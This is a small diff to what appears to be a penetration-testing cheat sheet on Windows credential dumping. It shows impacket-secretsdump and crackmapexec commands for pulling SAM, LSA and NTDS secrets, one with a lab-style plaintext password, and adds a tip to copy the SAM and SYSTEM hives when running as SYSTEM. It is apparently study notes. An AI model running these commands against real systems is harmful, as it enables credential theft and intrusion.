@@ -11,6 +11,9 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 #SAM / NTDS DUMP
 impacket-secretsdump <user>@<ip>
 crackmapexec smb <ip> -u <user> -p <password> --sam / --lsa / --ntds
+
+#IF you are NT SYSTEM
+Take a copy of SAM / SYSTEM.
 ```
 
 ### Silver Tickets
